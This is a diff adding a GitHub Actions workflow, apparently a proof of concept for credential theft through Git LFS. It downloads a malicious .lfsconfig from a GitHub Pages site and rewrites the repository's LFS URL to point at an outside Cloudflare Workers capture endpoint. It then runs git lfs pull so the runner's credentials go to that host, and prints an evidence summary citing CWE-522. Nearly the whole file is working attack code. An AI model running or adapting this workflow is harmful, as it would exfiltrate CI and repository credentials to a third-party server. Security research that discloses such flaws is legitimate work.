@@ -1,0 +1,53 @@
+name: DSM-002-V1 Credential Capture via GitHub Pages .lfsconfig
+
+on:
+  workflow_dispatch:
+  push:
+    paths:
+      - '.github/workflows/dsm002-v1-capture.yml'
+
+jobs:
+  lfs-credential-capture:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Simulate victim pulling malicious .lfsconfig from GitHub Pages
+        run: |
+          echo "=== Step 1: Victim downloads .lfsconfig from trusted GitHub Pages URL ==="
+          echo "Fetching: https://graomelo.github.io/lfs-github-pages-poc/.lfsconfig"
+          curl -sL https://graomelo.github.io/lfs-github-pages-poc/.lfsconfig
+          echo ""
+          echo "=== Step 2: Victim applies the malicious .lfsconfig ==="
+          # Download the attacker's .lfsconfig from GitHub Pages
+          curl -sL https://graomelo.github.io/lfs-github-pages-poc/.lfsconfig -o /tmp/malicious.lfsconfig
+          # Override the repo's LFS URL with the one from the malicious .lfsconfig
+          MALICIOUS_URL=$(git config -f /tmp/malicious.lfsconfig --get lfs.url)
+          echo "Malicious LFS URL extracted: $MALICIOUS_URL"
+          git config -f .lfsconfig lfs.url "$MALICIOUS_URL"
+          echo ""
+          echo "=== Git LFS effective endpoint ==="
+          git lfs env 2>&1 | grep -i endpoint
+
+      - name: Trigger LFS credential capture
+        run: |
+          echo "=== Running git lfs pull (LFS URL from GitHub Pages .lfsconfig) ==="
+          git config --global --add "http.https://lfs-capture.everton-win32.workers.dev.extraHeader" "x-auth-token: cloudflare"
+          git config --global --add "http.https://lfs-capture.everton-win32.workers.dev.extraHeader" "x-source: github-actions-v1"
+          git lfs pull 2>&1 || true
+          echo ""
+          echo "=== LFS pull completed - credentials captured via GitHub Pages .lfsconfig ==="
+
+      - name: Evidence summary
+        run: |
+          echo "## DSM-002-V1 Evidence"
+          echo "- Source: GitHub Actions runner (Azure)"
+          echo "- Attack vector: Malicious .lfsconfig served from GitHub Pages (trusted domain)"
+          echo "- GitHub Pages URL: https://graomelo.github.io/lfs-github-pages-poc/.lfsconfig"
+          echo "- LFS endpoint: https://lfs-capture.everton-win32.workers.dev (from GitHub Pages .lfsconfig)"
+          echo "- Header: x-auth-token: cloudflare (via http.<url>.extraHeader)"
+          echo "- CWE: CWE-522 (Insufficiently Protected Credentials)"
+          echo "- CVSS: 8.3 (High)"
